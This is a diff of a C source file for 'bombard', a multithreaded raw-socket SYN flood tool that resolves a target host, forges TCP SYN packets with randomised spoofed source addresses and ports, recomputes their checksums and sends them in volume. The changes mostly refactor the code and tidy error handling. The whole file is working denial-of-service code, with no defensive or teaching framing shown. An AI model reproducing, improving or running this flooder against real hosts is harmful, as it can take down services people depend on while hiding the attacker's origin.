@@ -4,7 +4,7 @@
  *
  * 	by ishiki, 2022
  *
- * 	compile command: gcc main.c -o bombard -lpthread
+ * 	compile command: gcc main.c -O2 -o bombard -lpthread
  */
 
 #include <time.h>
@@ -22,7 +22,9 @@
 #include <netinet/ip.h>
 #include <netinet/tcp.h>
 
+// payload buffer length
 #define PAYLOAD_LEN 2048
+// default payload
 #define DEF_PAYLOAD "GET / HTTP/1.1\r\n\r\n"
 // get a random byte
 #define RANDB (rand() & 0xFF)
@@ -31,13 +33,13 @@
 
 
 // pseudo header needed for checksum calculation
-struct ippseudo
+struct ippsd
 {
-	uint32_t ippseudo_src_addr;
-	uint32_t ippseudo_dst_addr;
-	uint8_t ippseudo_plhdr;
-	uint8_t ippseudo_proto;
-	uint16_t ippseudo_tcp_len;
+	uint32_t ippsd_src_addr;
+	uint32_t ippsd_dst_addr;
+	uint8_t ippsd_plhdr;
+	uint8_t ippsd_proto;
+	uint16_t ippsd_tcp_len;
 };
 
 // TCP packet
@@ -49,9 +51,9 @@ struct tcp_pkt
 };
 
 // pseudo TCP packet
-struct pseudo_tcp_pkt
+struct psd_tcp_pkt
 {
-	struct ippseudo ptp_ipps;
+	struct ippsd ptp_ippsd;
 	struct tcphdr ptp_tcphdr;
 	char ptp_payload[PAYLOAD_LEN];
 };
@@ -101,24 +103,14 @@ static int get_addr(const char *host, char *buff)
 	return 0;
 }
 
-// check if hostname starts with "http://"
-static int is_http(char *host)
+// check if str1 starts with str2
+static uint8_t starts_with(char *str1, char *str2)
 {
-	char tmp = host[7];
-	host[7] = '\0';
-	int res = strcmp("http://", host);
-	host[7] = tmp;
-
-	return res == 0;
-}
-
-// check if hostname starts with "https://"
-static int is_https(char *host)
-{
-	char tmp = host[8];
-	host[8] = '\0';
-	int res = strcmp("https://", host);
-	host[8] = tmp;
+	size_t trim = strlen(str2);
+	char tmp = str1[trim];
+	str1[trim] = '\0';
+	int res = strcmp(str1, str2);
+	str1[trim] = tmp;
 
 	return res == 0;
 }
@@ -142,12 +134,15 @@ static uint16_t chksum(uint16_t *data, size_t len)
 static int init_conn(struct conn_conf *con, in_addr_t dst_addr, 
 		in_port_t dst_port, const char *pl)
 {
-	int sock;
-	struct sockaddr_in sin;
-	struct tcp_pkt pkt;
+	// shortcuts to struct elements
+	int *sock = &con->cc_sock;
+	struct sockaddr_in *sin = &con->cc_sin;
+	struct iphdr *iph = &con->cc_tcp_pkt.tp_iphdr;
+	struct tcphdr *tcph = &con->cc_tcp_pkt.tp_tcphdr;
+	char *payload = con->cc_tcp_pkt.tp_payload;
 
 	// create raw socket
-	if ((sock = socket(PF_INET, SOCK_RAW, IPPROTO_TCP)) < 0) {
+	if ((*sock = socket(PF_INET, SOCK_RAW, IPPROTO_TCP)) < 0) {
 		perror("socket");
 		return -1;
 	}
@@ -156,109 +151,109 @@ static int init_conn(struct conn_conf *con, in_addr_t dst_addr,
 	strcpy(con->cc_tcp_pkt.tp_payload, pl);
 
 	// socket
-	sin.sin_family = AF_INET;
-	sin.sin_port = htons(dst_port);
-	sin.sin_addr.s_addr = rand_addr();
+	sin->sin_family = AF_INET;
+	sin->sin_port = htons(dst_port);
+	sin->sin_addr.s_addr = rand_addr();
 
 	// IP header
-	pkt.tp_iphdr.ihl = 5;
-	pkt.tp_iphdr.version = 4;
-	pkt.tp_iphdr.tos = 0;
-	pkt.tp_iphdr.tot_len = sizeof(struct tcp_pkt) - (PAYLOAD_LEN - strlen(pl));
-	pkt.tp_iphdr.id = htonl(54321);
-	pkt.tp_iphdr.frag_off = 0;
-	pkt.tp_iphdr.ttl = 255;
-	pkt.tp_iphdr.protocol = IPPROTO_TCP;
-	pkt.tp_iphdr.check = 0;
-	pkt.tp_iphdr.saddr = sin.sin_addr.s_addr;
-	pkt.tp_iphdr.daddr = dst_addr;
-	pkt.tp_iphdr.check = chksum((uint16_t *)&pkt.tp_iphdr, pkt.tp_iphdr.tot_len);
+	iph->ihl = 5;
+	iph->version = 4;
+	iph->tos = 0;
+	iph->tot_len = sizeof(struct tcp_pkt) - (PAYLOAD_LEN - strlen(pl));
+	iph->id = htonl(54321);
+	iph->frag_off = 0;
+	iph->ttl = 255;
+	iph->protocol = IPPROTO_TCP;
+	iph->check = 0;
+	iph->saddr = sin->sin_addr.s_addr;
+	iph->daddr = dst_addr;
+	iph->check = chksum((uint16_t *)iph, iph->tot_len);
 
 	// TCP header
-	pkt.tp_tcphdr.source = htons(RANDW);
-	pkt.tp_tcphdr.dest = htons(dst_port);
-	pkt.tp_tcphdr.seq = 0;
-	pkt.tp_tcphdr.ack_seq = 0;
-	pkt.tp_tcphdr.doff = 5;
-	pkt.tp_tcphdr.fin = 0;
-	pkt.tp_tcphdr.syn = 1;
-	pkt.tp_tcphdr.rst = 0;
-	pkt.tp_tcphdr.psh = 0;
-	pkt.tp_tcphdr.ack = 0;
-	pkt.tp_tcphdr.urg = 0;
-	pkt.tp_tcphdr.window = htons(5840);
-	pkt.tp_tcphdr.check = 0;
-	pkt.tp_tcphdr.urg_ptr = 0;
+	tcph->source = htons(RANDW);
+	tcph->dest = htons(dst_port);
+	tcph->seq = 0;
+	tcph->ack_seq = 0;
+	tcph->doff = 5;
+	tcph->fin = 0;
+	tcph->syn = 1;
+	tcph->rst = 0;
+	tcph->psh = 0;
+	tcph->ack = 0;
+	tcph->urg = 0;
+	tcph->window = htons(5840);
+	tcph->check = 0;
+	tcph->urg_ptr = 0;
 
 	// pseudo IP header
-	struct ippseudo ipps;
-	ipps.ippseudo_src_addr = sin.sin_addr.s_addr;
-	ipps.ippseudo_dst_addr = pkt.tp_iphdr.daddr;
-	ipps.ippseudo_plhdr = 0;
-	ipps.ippseudo_proto = IPPROTO_TCP;
-	ipps.ippseudo_tcp_len = htons(sizeof(struct tcphdr));
+	struct ippsd ipps;
+	ipps.ippsd_src_addr = iph->saddr;
+	ipps.ippsd_dst_addr = iph->daddr;
+	ipps.ippsd_plhdr = 0;
+	ipps.ippsd_proto = IPPROTO_TCP;
+	ipps.ippsd_tcp_len = htons(sizeof(struct tcphdr));
 
 	// pseudo TCP packet
-	struct pseudo_tcp_pkt ppkt = {
-		.ptp_ipps = ipps,
-		.ptp_tcphdr = pkt.tp_tcphdr,
+	struct psd_tcp_pkt ppkt = {
+		.ptp_ippsd = ipps,
+		.ptp_tcphdr = *tcph,
 	};
-	strcpy(ppkt.ptp_payload, pkt.tp_payload);
-	size_t len = sizeof(struct pseudo_tcp_pkt) - (PAYLOAD_LEN - strlen(pl));
+	strcpy(ppkt.ptp_payload, payload);
+	size_t len = sizeof(struct psd_tcp_pkt) - (PAYLOAD_LEN - strlen(pl));
 
 	// TCP packet checksum
-	pkt.tp_tcphdr.check = chksum((uint16_t *)&ppkt, len);
+	tcph->check = chksum((uint16_t *)&ppkt, len);
 
 	int one = 1;
-	if (setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(int)) < 0) {
+	if (setsockopt(*sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(int)) < 0) {
 		perror("setsockopt");
 		return -1;
 	}
 
-	con->cc_sin = sin;
-	con->cc_sock = sock;
-	con->cc_tcp_pkt = pkt;
 	return 0;
 }
 
 // spoof TCP packet by changing source IP, source port and header checksums
 static void spoof_pkt(struct conn_conf *con)
 {
+	struct tcp_pkt *tcpp = &con->cc_tcp_pkt;
 	con->cc_sin.sin_addr.s_addr = rand_addr();
-
-	con->cc_tcp_pkt.tp_iphdr.saddr = con->cc_sin.sin_addr.s_addr;
-	con->cc_tcp_pkt.tp_iphdr.check = 0;
-	con->cc_tcp_pkt.tp_iphdr.check = chksum(
-		(uint16_t *)&con->cc_tcp_pkt.tp_iphdr, con->cc_tcp_pkt.tp_iphdr.tot_len);
+	tcpp->tp_iphdr.saddr = con->cc_sin.sin_addr.s_addr;
+	tcpp->tp_iphdr.check = 0;
+	tcpp->tp_iphdr.check = chksum((uint16_t *)&tcpp->tp_iphdr, 
+			tcpp->tp_iphdr.tot_len);
 	con->cc_tcp_pkt.tp_tcphdr.source = htons(RANDW);
 
 	// pseudo IP header
-	struct ippseudo ipps;
-	ipps.ippseudo_src_addr = con->cc_sin.sin_addr.s_addr;
-	ipps.ippseudo_dst_addr = con->cc_tcp_pkt.tp_iphdr.daddr;
-	ipps.ippseudo_plhdr = 0;
-	ipps.ippseudo_proto = IPPROTO_TCP;
-	ipps.ippseudo_tcp_len = htons(sizeof(struct tcphdr));
+	struct ippsd ipps;
+	ipps.ippsd_src_addr = con->cc_sin.sin_addr.s_addr;
+	ipps.ippsd_dst_addr = con->cc_tcp_pkt.tp_iphdr.daddr;
+	ipps.ippsd_plhdr = 0;
+	ipps.ippsd_proto = IPPROTO_TCP;
+	ipps.ippsd_tcp_len = htons(sizeof(struct tcphdr));
 
 	// pseudo TCP packet
-	struct pseudo_tcp_pkt ppkt = {
-		.ptp_ipps = ipps,
+	struct psd_tcp_pkt ppkt = {
+		.ptp_ippsd = ipps,
 		.ptp_tcphdr = con->cc_tcp_pkt.tp_tcphdr
 	};
-	strcpy(ppkt.ptp_payload, con->cc_tcp_pkt.tp_payload);
-	size_t len = sizeof(struct pseudo_tcp_pkt) - (PAYLOAD_LEN - strlen(ppkt.ptp_payload));
+	strcpy(ppkt.ptp_payload, tcpp->tp_payload);
+	size_t len = sizeof(struct psd_tcp_pkt) - 
+		(PAYLOAD_LEN - strlen(ppkt.ptp_payload));
 	
 	// TCP packet checksum
-	con->cc_tcp_pkt.tp_tcphdr.check = chksum((uint16_t *)&ppkt, len);
+	tcpp->tp_tcphdr.check = chksum((uint16_t *)&ppkt, len);
 }
 
 // send packet to its destination
 static int snd_pkt(const struct conn_conf *con)
 {
-	++nsent;
-	return sendto(con->cc_sock, (void *)&con->cc_tcp_pkt, 
+	int res = sendto(con->cc_sock, (void *)&con->cc_tcp_pkt, 
 		con->cc_tcp_pkt.tp_iphdr.tot_len, 0, 
 		(struct sockaddr *)&con->cc_sin, sizeof(struct sockaddr_in));
+	nsent += (res >= 0);
+
+	return res;
 }
 
 // bombardier thread
@@ -338,18 +333,21 @@ int main(int argc, char **argv)
 			d = 1;
 			char *hostname = argv[++i];
 
-			if (is_http(hostname)) {
+			if (starts_with(hostname, "http://")) {
 				dst_port = 80;
 				hostname += 7; 	// trim "http://"
-			} else if (is_https(hostname)) {
+			} else if (starts_with(hostname, "https://")) {
 				dst_port = 443;
 				hostname += 8; 	// trim "https://"
 			}
 
+			size_t namelen = strlen(hostname);
+			if (hostname[namelen - 1] == '/')
+				hostname[namelen - 1] = '\0'; // trim slash
+
 			dst_addr = malloc(NI_MAXHOST);
 			if (get_addr(hostname, dst_addr) < 0) {
-				char msg[] = "unable to resolve host\n";
-				write(STDERR_FILENO, msg, sizeof(msg));
+				fputs("unable to resolve host\n", stderr);
 				return EXIT_FAILURE;
 			}
 
@@ -374,13 +372,13 @@ int main(int argc, char **argv)
 			print_help();
 			return EXIT_SUCCESS;
 		default:
-			printf("error: invalid flag\n");
+			fputs("invalid flag\n", stderr);
 			return EXIT_FAILURE;
 		}
 	}
 
 	if (!ok) {
-		printf("error: destination IP address or host url required/n");
+		fputs("destination IP address or host URL required\n", stderr);
 		return EXIT_FAILURE;
 	}
 
